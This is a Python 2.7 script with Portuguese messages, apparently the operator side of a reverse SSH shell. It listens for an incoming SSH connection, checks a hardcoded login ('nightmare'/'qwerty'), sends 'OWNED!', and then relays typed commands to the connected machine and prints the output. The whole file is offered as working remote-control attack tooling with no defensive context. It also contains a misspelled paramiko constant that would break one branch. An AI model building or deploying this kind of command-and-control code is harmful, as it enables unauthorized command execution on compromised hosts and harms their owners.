
#!/usr/bin/env python2.7
#coding=UTF-8

import paramiko
import getopt
import threading
import sys
import socket


class Server(paramiko.ServerInterface):
	def __init__(self, server, port):
		self.event = threading.Event()
		self.HOST_KEY = paramiko.RSAKey(filename='test_rsa.key')
		self.USERNAME = 'nightmare'
		self.PASSWORD = 'qwerty'
		self.server = server
		self.port = int(port)
	def check_channel_request(self, kind, chanid):
		if kind == 'session':
			return paramiko.OPEN_SUCCEEDED
		return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PHOHIBITED
	def check_auth_password(self, username, password):
		if (username == self.USERNAME) and (password == self.PASSWORD):
			return paramiko.AUTH_SUCCESSFUL
		return paramiko.AUTH_FAILED

	def start(self):
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			sock.bind((self.server, self.port))
			sock.listen(100)
			print "[+] Esperando por conexoes ..."
			client, addr = sock.accept()
		except Exception, e:
			print "[-] Falha na conexao: "+str(e)
			sys.exit(1)
		print "[+] Conexao estabelecida!"

		try:
			Session = paramiko.Transport(client)
			Session.add_server_key(self.HOST_KEY)
			paramiko.util.log_to_file("log/shell.log")
			server = Server(self.server,self.port)
			try:
				Session.start_server(server=server)
			except paramiko.SSHException, x:
				print '[-] Negociacao SSH falhou.'
			chan = Session.accept(10)
			print '[+] Autenticado!'
			chan.send("OWNED!")
			while 1:
				try:
					command = raw_input("comando> ").strip('\n')
					if command != 'exit':
						chan.send(command)
						print chan.recv(1024) + '\n'
					else:
						chan.send('exit')
						print '[*] Saindo ...'
						Session.close()
						raise Exception('exit')
				except KeyboardInterrupt:
					Session.close()
		except Exception, e:
			print "[-] Deu ruim!: " + str(e)
			try:
				Session.close()
			except:
				pass
			sys.exit(1)
	def stop(self):
		sys.exit(1)
